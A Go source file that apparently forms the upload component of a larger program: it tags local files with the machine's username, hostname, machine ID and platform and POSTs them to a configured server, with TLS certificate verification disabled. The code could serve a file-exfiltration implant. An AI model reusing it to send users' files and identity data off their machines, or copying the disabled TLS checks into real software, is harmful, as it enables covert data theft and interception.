package requests

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

type hTTPInfo struct {
	config         Config
	runTimeDetails runTimeDetails
}

type Config struct {
	Host      string            `json:"Host"`
	UserAgent string            `json:"UserAgent"`
	Headers   map[string]string `json:"Headers"`
}

type runTimeDetails struct {
	username  string
	hostname  string
	machineID string
	platform  string
}

var requestInfo hTTPInfo

func SetRequestInfo(config Config) {
	requestInfo.config = config
}

func SetRunTimeInfo(username, hostname, machineid, platform string) {
	requestInfo.runTimeDetails.username = username
	requestInfo.runTimeDetails.hostname = hostname
	requestInfo.runTimeDetails.machineID = machineid
	requestInfo.runTimeDetails.platform = platform
}

func PostFile(fpath string) (http.Response, []byte, error) {
	b, err := os.ReadFile(fpath)
	if err != nil {
		return http.Response{}, nil, err
	}
	return PostData(filepath.Base(fpath), "application/zip", b)
}

func PostData(filename, content_type string, body []byte) (http.Response, []byte, error) {
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/supload/?filename=%s&machineid=%s&username=%s&hostname=%s&platform=%s",
		requestInfo.config.Host,
		filename,
		requestInfo.runTimeDetails.machineID,
		requestInfo.runTimeDetails.username,
		requestInfo.runTimeDetails.hostname,
		requestInfo.runTimeDetails.platform), bytes.NewBuffer(body))

	if err != nil {
		return http.Response{}, nil, err
	}

	req.Header.Add("user-agent", requestInfo.config.UserAgent)
	req.Header.Add("Content-Type", content_type)
	for k, v := range requestInfo.config.Headers {
		req.Header.Add(k, v)
	}

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := http.Client{Transport: tr,
		CheckRedirect: func(r *http.Request, via []*http.Request) error {
			r.URL.Opaque = r.URL.Path
			return nil
		}}

	resp, err := client.Do(req)
	if err != nil {
		return http.Response{}, nil, err
	}
	defer resp.Body.Close()

	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return http.Response{}, nil, err
	}

	return *resp, res, err
}

func Checksignature(resp *http.Response, referenceSig string) bool {
	cert := resp.TLS.PeerCertificates[0]
	return hex.EncodeToString(cert.Signature) == referenceSig
}
